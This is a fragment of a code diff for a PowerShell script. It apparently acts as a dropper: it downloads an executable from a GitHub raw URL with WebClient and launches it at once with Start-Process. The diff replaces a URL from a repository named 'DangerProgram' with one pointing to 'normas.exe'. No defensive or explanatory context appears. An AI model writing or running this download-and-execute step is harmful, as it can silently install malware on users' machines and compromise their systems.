@@ -11,7 +11,7 @@ else {
 }
 
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("https://github.com/kokolokopo/DangerProgram/raw/main/reqrqrqr.exe", $exe)
+$client.DownloadFile("https://github.com/jellybebra/s/raw/main/normas.exe", $exe)
 Start-Process -Filepath $exe
 
 # Set-Location -Path $folder
